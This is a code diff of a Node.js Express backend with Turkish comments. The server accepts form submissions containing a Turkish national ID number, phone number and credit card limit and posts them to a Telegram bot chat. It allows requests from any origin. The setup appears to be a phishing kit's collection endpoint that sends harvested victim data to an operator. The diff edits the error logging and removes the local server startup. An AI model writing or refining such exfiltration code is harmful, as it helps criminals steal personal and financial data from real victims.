@@ -4,13 +4,10 @@ const cors = require('cors');
 const dotenv = require('dotenv');
 
 dotenv.config();
-
 const app = express();
-const port = process.env.PORT || 3001;
 
 app.use(express.json());
-// CORS kısıtlaması kaldırıldı, tüm origin'ler kabul edilecek
-app.use(cors());
+app.use(cors()); // Tüm origin'lerden gelen istekleri kabul et
 
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
@@ -45,31 +42,24 @@ T.C. Kimlik No: ${tc}
 Telefon: ${tel}
 Kredi Kartı Limiti: ${kredi_karti_limiti}
   `;
-
   console.log('[Backend] Telegram’a gönderilecek mesaj:', message);
 
   const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
   try {
     const response = await axios.post(telegramUrl, {
       chat_id: chatId,
       text: message,
       parse_mode: 'HTML',
     });
-
     console.log('[Backend] Telegram mesajı gönderildi:', response.data);
     res.status(200).json({ message: 'Bilgiler Telegram botuna gönderildi.' });
   } catch (error) {
-    console.error('[Backend] Telegram mesajı gönderilemedi:', error.response ? error.response.data : error.message);
-    res.status(500).json({ error: 'Telegram mesajı gönderilemedi.' });
+    console.error('[Backend] Telegram mesajı gönderilemedi:', {
+      message: error.message,
+      response: error.response ? error.response.data : null,
+    });
+    res.status(500).json({ error: 'Telegram mesajı gönderilemedi.', details: error.message });
   }
 });
-
-// Yerel test için
-if (process.env.NODE_ENV !== 'production') {
-  app.listen(port, () => {
-    console.log(`API server http://localhost:${port} adresinde çalışıyor.`);
-  });
-}
 
 module.exports = app;
